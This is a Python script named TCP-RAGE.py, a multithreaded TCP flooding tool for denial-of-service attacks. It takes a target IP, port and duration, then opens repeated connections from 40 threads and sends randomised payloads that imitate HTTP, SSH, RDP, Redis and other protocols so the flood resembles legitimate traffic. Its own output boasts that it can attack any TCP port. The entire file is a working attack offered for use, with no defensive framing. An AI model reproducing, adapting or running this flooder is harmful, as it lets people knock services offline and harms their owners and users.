import socket
import sys
import time
import random
import threading
import gzip
import json
import base64

class UniversalTCPBypass:
    def __init__(self, target_ip, port, duration):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.num_threads = 40
        self.running = True
        
        # Protocol-specific payload generators
        self.protocol_handlers = {
            'http': self.create_http_payload,
            'https': self.create_http_payload,
            'smtp': self.create_smtp_payload,
            'ftp': self.create_ftp_payload,
            'ssh': self.create_ssh_payload,
            'dns': self.create_dns_payload,
            'mysql': self.create_mysql_payload,
            'redis': self.create_redis_payload,
            'mongodb': self.create_mongodb_payload,
            'rdp': self.create_rdp_payload,
            'vnc': self.create_vnc_payload,
            'sip': self.create_sip_payload,
            'rtsp': self.create_rtsp_payload,
            'telnet': self.create_telnet_payload,
            'ntp': self.create_ntp_payload,
            'snmp': self.create_snmp_payload,
            'ldap': self.create_ldap_payload,
            'irc': self.create_irc_payload,
            'binary': self.create_binary_payload,
            'random': self.create_random_protocol_payload
        }
        
        # Common ports and their protocols
        self.common_ports = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 53: 'dns',
            80: 'http', 110: 'pop3', 143: 'imap', 443: 'https', 993: 'imaps',
            995: 'pop3s', 1433: 'mssql', 1521: 'oracle', 3306: 'mysql',
            3389: 'rdp', 5432: 'postgresql', 6379: 'redis', 27017: 'mongodb',
            5060: 'sip', 554: 'rtsp', 1900: 'upnp', 161: 'snmp', 389: 'ldap'
        }

    def detect_protocol(self, port):
        """Detect likely protocol based on port number"""
        return self.common_ports.get(port, 'random')

    def create_http_payload(self):
        """HTTP/HTTPS payload"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS']
        paths = ['/', '/index.html', '/api/v1/data', '/wp-admin', '/static/js/app.js']
        
        method = random.choice(methods)
        path = random.choice(paths)
        
        headers = [
            f'{method} {path} HTTP/1.1',
            f'Host: {self.target_ip}',
            f'User-Agent: {random.choice(self.get_user_agents())}',
            f'Accept: {random.choice(["*/*", "text/html", "application/json"])}',
            f'Connection: {random.choice(["keep-alive", "close"])}',
            f'Content-Length: {random.randint(50, 500)}'
        ]
        
        payload = '\r\n'.join(headers) + '\r\n\r\n'
        if method in ['POST', 'PUT']:
            payload += f'data={base64.b64encode(random.randbytes(100)).decode()}'
        
        return payload.encode()

    def create_smtp_payload(self):
        """SMTP protocol payload"""
        commands = [
            f'EHLO {random.choice(["localhost", "mail.example.com", "client"])}\r\n',
            'MAIL FROM: <sender@example.com>\r\n',
            'RCPT TO: <recipient@example.com>\r\n',
            'DATA\r\n',
            f'Subject: Test {random.randint(1000, 9999)}\r\n\r\n',
            f'Message content: {base64.b64encode(random.randbytes(50)).decode()}\r\n.\r\n'
        ]
        return random.choice(commands).encode()

    def create_ftp_payload(self):
        """FTP protocol payload"""
        commands = [
            'USER anonymous\r\n',
            'PASS anonymous@example.com\r\n',
            'LIST\r\n',
            'RETR file.txt\r\n',
            'STOR upload.txt\r\n',
            f'PORT {",".join(str(random.randint(1, 255)) for _ in range(4))},{random.randint(1, 255)},{random.randint(1, 255)}\r\n'
        ]
        return random.choice(commands).encode()

    def create_ssh_payload(self):
        """SSH protocol payload"""
        ssh_header = b'SSH-2.0-OpenSSH_8.4\r\n'
        return ssh_header + random.randbytes(random.randint(50, 200))

    def create_dns_payload(self):
        """DNS protocol payload"""
        # Simple DNS query simulation
        domains = ['google.com', 'example.com', 'test.org', 'api.service.com']
        domain = random.choice(domains)
        return f"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00{domain}\x00\x00\x01\x00\x01".encode()

    def create_mysql_payload(self):
        """MySQL protocol payload"""
        mysql_header = b'\x00\x00\x00\x02'  # Basic MySQL packet
        return mysql_header + random.randbytes(random.randint(50, 150))

    def create_redis_payload(self):
        """Redis protocol payload"""
        commands = [
            f"*2\r\n$3\r\nGET\r\n${random.randint(5, 10)}\r\nkey{random.randint(1, 1000)}\r\n",
            f"*3\r\n$3\r\nSET\r\n${random.randint(5, 10)}\r\nkey{random.randint(1, 1000)}\r\n${random.randint(10, 50)}\r\n{base64.b64encode(random.randbytes(30)).decode()}\r\n",
            "*1\r\n$4\r\nPING\r\n"
        ]
        return random.choice(commands).encode()

    def create_mongodb_payload(self):
        """MongoDB protocol payload"""
        # MongoDB OP_QUERY simulation
        header = b'\x00\x00\x00\x00'  # Message length placeholder
        header += b'\x00\x00\x00\x00'  # Request ID
        header += b'\x00\x00\x00\x00'  # Response To
        header += b'\xd4\x07\x00\x00'  # OP_QUERY
        return header + random.randbytes(random.randint(100, 300))

    def create_rdp_payload(self):
        """RDP protocol payload"""
        rdp_header = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
        return rdp_header + random.randbytes(random.randint(50, 150))

    def create_vnc_payload(self):
        """VNC protocol payload"""
        return b'RFB 003.008\n' + random.randbytes(random.randint(50, 100))

    def create_sip_payload(self):
        """SIP protocol payload"""
        methods = ['INVITE', 'REGISTER', 'BYE', 'OPTIONS']
        method = random.choice(methods)
        return f"{method} sip:user@{self.target_ip} SIP/2.0\r\nVia: SIP/2.0/UDP {'.'.join(str(random.randint(1, 255)) for _ in range(4))}:5060\r\n\r\n".encode()

    def create_rtsp_payload(self):
        """RTSP protocol payload"""
        return f"OPTIONS rtsp://{self.target_ip}:{self.port}/ RTSP/1.0\r\nCSeq: {random.randint(1, 100)}\r\n\r\n".encode()

    def create_telnet_payload(self):
        """Telnet protocol payload"""
        return b'\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18' + random.randbytes(random.randint(50, 100))

    def create_ntp_payload(self):
        """NTP protocol payload"""
        ntp_header = b'\x1b' + random.randbytes(47)  # NTP v3, client mode
        return ntp_header

    def create_snmp_payload(self):
        """SNMP protocol payload"""
        return b'\x30' + random.randbytes(random.randint(40, 80))  # ASN.1 sequence

    def create_ldap_payload(self):
        """LDAP protocol payload"""
        return b'0\x84\x00\x00\x00' + random.randbytes(random.randint(50, 100))

    def create_irc_payload(self):
        """IRC protocol payload"""
        commands = [
            f"NICK user{random.randint(1000, 9999)}\r\n",
            f"USER guest 0 * :Real Name\r\n",
            f"JOIN #channel{random.randint(1, 10)}\r\n",
            f"PRIVMSG #channel :Hello world {random.randint(1, 100)}\r\n"
        ]
        return random.choice(commands).encode()

    def create_binary_payload(self):
        """Generic binary payload"""
        return random.randbytes(random.randint(100, 500))

    def create_random_protocol_payload(self):
        """Random protocol payload for unknown ports"""
        protocols = list(self.protocol_handlers.keys())
        protocol = random.choice(protocols)
        if protocol != 'random':  # Avoid recursion
            return self.protocol_handlers[protocol]()
        return self.create_binary_payload()

    def get_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0'
        ]

    def tcp_flood_worker(self, worker_id):
        """Universal TCP flood worker for any port"""
        try:
            protocol = self.detect_protocol(self.port)
            start_time = time.time()
            
            while self.running and time.time() - start_time < self.duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.settimeout(random.uniform(2.0, 5.0))
                    
                    # Connect
                    sock.connect((self.target_ip, self.port))
                    
                    # Send protocol-specific payloads
                    for _ in range(random.randint(3, 10)):
                        if not self.running:
                            break
                        
                        payload = self.protocol_handlers[protocol]()
                        sock.send(payload)
                        
                        # Random delay
                        time.sleep(random.uniform(0.01, 0.1))
                        
                        # Occasionally read response
                        if random.random() > 0.7:
                            try:
                                sock.recv(1024)
                            except:
                                pass
                    
                    sock.close()
                    time.sleep(random.uniform(0.05, 0.2))
                    
                except (socket.timeout, socket.error, ConnectionRefusedError, ConnectionResetError):
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(random.uniform(0.1, 0.5))
                    
        except Exception:
            pass

    def start_flood(self):
        """Start universal TCP flood"""
        protocol = self.detect_protocol(self.port)
        print(f"Starting Universal TCP Flood")
        print(f"Target: {self.target_ip}:{self.port}")
        print(f"Protocol: {protocol.upper()}")
        print(f"Duration: {self.duration}s")
        print(f"Threads: {self.num_threads}")
        print("Capable of attacking ANY TCP port")
        print("Press Ctrl+C to stop\n")
        
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.tcp_flood_worker, args=(i,), daemon=True)
            threads.append(thread)
            thread.start()
        
        try:
            start_time = time.time()
            while time.time() - start_time < self.duration and self.running:
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                print(f"\rElapsed: {elapsed}s | Remaining: {remaining}s | Active: {self.num_threads} threads", end="", flush=True)
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\nStopping flood...")
        finally:
            self.running = False
            for thread in threads:
                thread.join(timeout=2)
            
        print("\nFlood completed")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 TCP-RAGE.py <IP> <PORT> <DURATION>")
        print("Example: python3 TCP-RAGE.py 192.168.1.1 22 300")
        return 1

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    flooder = UniversalTCPBypass(target_ip, port, duration)
    flooder.start_flood()
    return 0

if __name__ == "__main__":
    sys.exit(main())
